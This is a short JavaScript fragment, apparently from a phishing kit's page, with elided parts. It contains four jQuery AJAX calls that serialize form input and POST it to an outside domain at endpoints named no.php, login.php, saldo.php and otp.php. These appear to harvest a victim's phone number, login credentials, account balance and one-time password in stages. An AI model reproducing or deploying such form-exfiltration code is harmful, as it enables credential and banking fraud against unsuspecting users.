// index
 ...
 $.ajax({
 type: 'POST',
 url: 'https://axellent.aa-click.cfd/kim/no.php',
 data: $(this).serialize(),
 datatype: 'JSON', 
...
$.ajax({
 type: 'POST',
 url: 'https://axellent.aa-click.cfd/kim/login.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(), 
 complete: function(data) {
...
$.ajax({
 type: 'POST',
 url: 'https://axellent.aa-click.cfd/kim/saldo.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(), 
 complete: function(data) {
...
$.ajax({
 type: 'POST',
 url: 'https://axellent.aa-click.cfd/kim/otp.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(), 
 complete: function(data) {
